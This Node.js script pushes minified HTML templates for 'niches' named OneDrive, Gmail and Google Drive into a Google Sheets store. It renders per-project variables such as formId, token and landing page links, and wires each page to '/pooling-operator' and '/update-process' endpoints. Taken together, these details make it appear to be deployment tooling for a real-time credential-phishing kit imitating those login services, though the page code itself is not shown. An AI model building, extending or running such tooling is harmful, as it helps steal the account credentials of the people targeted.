// tools/deploy-template.js
// Dynamic multi-niche template and projects deployment script for Google Sheets.
// Usage:
//   node tools/deploy-template.js --niche onedrive
//   node tools/deploy-template.js --niche gmail
//   node tools/deploy-template.js --niche gdrive
//   node tools/deploy-template.js --all

const fs = require('fs');
const path = require('path');
const JSON5 = require('json5');
const { google } = require('googleapis');

const ROOT = path.join(__dirname, '..');

// Helper to read .env
function getEnv(key) {
    if (!fs.existsSync(path.join(ROOT, '.env'))) return '';
    const lines = fs.readFileSync(path.join(ROOT, '.env'), 'utf8').split('\n');
    for (const l of lines) {
        if (l.trim().startsWith(key + '=')) {
            return l.trim().slice(key.length + 1).replace(/^['"]|['"]$/g, '');
        }
    }
    return '';
}

// Helper to get active OAuth client (resolving refreshed token from SETTINGS if needed)
async function getAuthenticatedClient() {
    const oauthJsonStr = getEnv('GOOGLE_OAUTH2_JSON');
    if (!oauthJsonStr) throw new Error('Missing GOOGLE_OAUTH2_JSON in .env');
    const oauthJson = JSON5.parse(oauthJsonStr);
    const client = new google.auth.OAuth2(oauthJson.web.client_id, oauthJson.web.client_secret);

    // Try token from resolved_token.txt or .env
    const tokenFile = path.join(ROOT, 'scratch', 'resolved_token.txt');
    let refreshToken = fs.existsSync(tokenFile) ? fs.readFileSync(tokenFile, 'utf8').trim() : getEnv('GOOGLE_DRIVE_REFRESH_TOKEN');

    client.setCredentials({ refresh_token: refreshToken });

    try {
        await client.getAccessToken();
        return client;
    } catch (err) {
        console.warn('[deploy-template] Token expired or invalid (' + err.message + '). Fetching fresh token from SETTINGS sheet...');
        const scriptUrl = getEnv('SCRIPT_URL');
        if (!scriptUrl) throw new Error('Cannot refresh token: SCRIPT_URL missing in .env');

        const fetchRes = await fetch(scriptUrl + '?action=getData&sheetname=SETTINGS');
        const settingsJson = await fetchRes.json();
        const settingsRows = settingsJson.data || [];
        let freshToken = '';
        for (const row of settingsRows) {
            if (row.key === 'googleRefreshToken' || row[0] === 'googleRefreshToken') {
                freshToken = row.value || row[1];
                break;
            }
        }
        if (!freshToken) throw new Error('Could not find googleRefreshToken in SETTINGS sheet');

        if (!fs.existsSync(path.join(ROOT, 'scratch'))) {
            fs.mkdirSync(path.join(ROOT, 'scratch'), { recursive: true });
        }
        fs.writeFileSync(tokenFile, freshToken, 'utf8');
        client.setCredentials({ refresh_token: freshToken });
        await client.getAccessToken();
        console.log('[deploy-template] Successfully acquired active token from SETTINGS sheet.');
        return client;
    }
}

// Niche configuration definitions
const NICHE_CONFIG = {
    onedrive: {
        name: 'OneDrive',
        sourceMinFile: 'onedrie-sererless.min.html',
        templateIds: ['tpt06', 'tpt07', 'tpt08'],
        plainTemplateIds: ['tpt05'],
        titleMatch: /onedrive/i
    },
    gmail: {
        name: 'Gmail',
        sourceMinFile: 'gmail-serverless.min.html',
        templateIds: ['tpt17', 'tpt18'],
        plainTemplateIds: ['tpt16'],
        titleMatch: /gmail/i
    },
    gdrive: {
        name: 'Google Drive',
        sourceMinFile: 'google-drive-serverless.min.html',
        templateIds: ['tpt20', 'tpt21'],
        plainTemplateIds: ['tpt19'],
        titleMatch: /drive/i
    }
};

// Render variables into template string
function renderTemplate(minHtml, varsObj, formId) {
    let out = minHtml;
    // Standard variables replacement
    for (const [key, val] of Object.entries(varsObj)) {
        out = out.split(`{{${key}}}`).join(val !== undefined && val !== null ? String(val) : '');
    }

    // Specific known mappings
    if (formId) {
        out = out.split('{{formId}}').join(formId);
    }
    if (varsObj.token) {
        out = out.split('{{token}}').join(varsObj.token);
    }
    if (varsObj.landingPageLink) {
        out = out.split('{{landingPageLink}}').join(varsObj.landingPageLink);
    }

    // Polling and update URL resolution
    const postURL = varsObj.postURL || '';
    if (postURL && postURL.trim() !== '') {
        const cleanPost = postURL.replace(/\/+$/, '');
        out = out.split('{{pollingUrl}}').join(cleanPost + '/pooling-operator');
        out = out.split('{{updateUrl}}').join(cleanPost + '/update-process');
    } else {
        out = out.split('{{pollingUrl}}').join('');
        out = out.split('{{updateUrl}}').join('');
    }

    return out;
}

async function deployNiche(sheets, dbId, nicheKey) {
    const config = NICHE_CONFIG[nicheKey];
    if (!config) throw new Error(`Unknown niche: ${nicheKey}`);

    console.log(`\n========================================`);
    console.log(`DEPLOYING NICHE: ${config.name} (${nicheKey})`);
    console.log(`========================================`);

    const sourcePath = path.join(ROOT, config.sourceMinFile);
    if (!fs.existsSync(sourcePath)) {
        throw new Error(`Source minified file not found: ${sourcePath}`);
    }
    const minHtml = fs.readFileSync(sourcePath, 'utf8');
    const hardLimit = 50000;
    const gateLimit = 49500;

    console.log(`Source template: ${config.sourceMinFile} (${minHtml.length} chars)`);
    if (minHtml.length > gateLimit) {
        console.warn(`WARNING: Source template length ${minHtml.length} exceeds internal gate of ${gateLimit} chars!`);
    }
    if (minHtml.length > hardLimit) {
        throw new Error(`ABORT: Source template length ${minHtml.length} exceeds Google Sheets cell limit of ${hardLimit} chars!`);
    }

    // 1. Update Master 'template' sheet
    console.log(`\n1. Updating Master 'template' sheet...`);
    const tRes = await sheets.spreadsheets.values.get({
        spreadsheetId: dbId,
        range: 'template!A1:H50'
    });
    const tRows = tRes.data.values || [];
    let templateUpdateCount = 0;

    for (let i = 1; i < tRows.length; i++) {
        const row = tRows[i];
        const tptId = row[1] || '';
        const tptName = row[5] || '';
        const rowNumber = i + 1;

        if (config.templateIds.includes(tptId) || (config.titleMatch.test(tptName) && !config.plainTemplateIds.includes(tptId))) {
            console.log(`  Updating template row ${rowNumber}: [${tptId}] "${tptName}"`);
            await sheets.spreadsheets.values.update({
                spreadsheetId: dbId,
                range: `template!H${rowNumber}`,
                valueInputOption: 'RAW',
                requestBody: { values: [[minHtml]] }
            });
            templateUpdateCount++;
        }
    }
    console.log(`  Master template rows updated: ${templateUpdateCount}`);

    // 2. Scan and dynamically update 'projects' sheet
    console.log(`\n2. Scanning and updating 'projects' sheet...`);
    const pRes = await sheets.spreadsheets.values.get({
        spreadsheetId: dbId,
        range: 'projects!A1:T100'
    });
    const pRows = pRes.data.values || [];
    const pHeaders = pRows[0] || [];

    const tTitleIdx = pHeaders.indexOf('templateTitle');
    const tIdIdx = pHeaders.indexOf('templateId');
    const pIdIdx = pHeaders.indexOf('projectId');
    const formIdIdx = pHeaders.indexOf('formId');
    const tVarsIdx = pHeaders.indexOf('templateVariables');
    const tCodeIdx = pHeaders.indexOf('templateCode');

    if (tTitleIdx === -1 || tIdIdx === -1 || tVarsIdx === -1 || tCodeIdx === -1) {
        throw new Error(`Could not find required columns in projects header. Found: ${JSON.stringify(pHeaders)}`);
    }

    let projectUpdateCount = 0;
    for (let i = 1; i < pRows.length; i++) {
        const row = pRows[i];
        const title = row[tTitleIdx] || '';
        const tid = row[tIdIdx] || '';
        const pid = row[pIdIdx] || '';
        const fid = row[formIdIdx] || '';
        const varsRaw = row[tVarsIdx] || '';
        const rowNumber = i + 1;

        // Check if row matches this niche by templateTitle (ignoring PLAIN templates)
        const isMatch = config.titleMatch.test(title) && !config.plainTemplateIds.includes(tid);
        if (isMatch) {
            let varsObj = {};
            try {
                if (varsRaw.trim().startsWith('{')) {
                    varsObj = JSON.parse(varsRaw);
                }
            } catch (e) {
                console.warn(`    Row ${rowNumber} (${pid}): Failed to parse templateVariables JSON: ${e.message}`);
            }

            const renderedCode = renderTemplate(minHtml, varsObj, fid || varsObj.formId);
            console.log(`  Updating project row ${rowNumber}: [${pid}] tid=${tid} title="${title}" (rendered len: ${renderedCode.length})`);

            if (renderedCode.length > hardLimit) {
                console.warn(`    WARNING: Rendered code for project row ${rowNumber} is ${renderedCode.length} chars (exceeds ${hardLimit})!`);
            }

            await sheets.spreadsheets.values.update({
                spreadsheetId: dbId,
                range: `projects!S${rowNumber}`,
                valueInputOption: 'RAW',
                requestBody: { values: [[renderedCode]] }
            });
            projectUpdateCount++;
        }
    }
    console.log(`  Projects sheet rows updated: ${projectUpdateCount}`);
    console.log(`DEPLOY COMPLETE FOR: ${config.name}`);
}

(async () => {
    try {
        const args = process.argv.slice(2);
        let nicheArg = 'onedrive';
        let allNiches = false;

        for (let i = 0; i < args.length; i++) {
            if (args[i] === '--niche' && args[i + 1]) {
                nicheArg = args[i + 1].toLowerCase();
                i++;
            } else if (args[i] === '--all') {
                allNiches = true;
            }
        }

        const client = await getAuthenticatedClient();
        const sheets = google.sheets({ version: 'v4', auth: client });
        const dbId = '17cjaHx93z3ciGAdgJ4AvkjgIwI9gP3RsfJU5G7exp-U';

        if (allNiches) {
            for (const key of Object.keys(NICHE_CONFIG)) {
                await deployNiche(sheets, dbId, key);
            }
        } else {
            await deployNiche(sheets, dbId, nicheArg);
        }

        console.log('\nAll deployments finished successfully.');
    } catch (e) {
        console.error('\nDeployment failed:', e.message);
        process.exit(1);
    }
})();
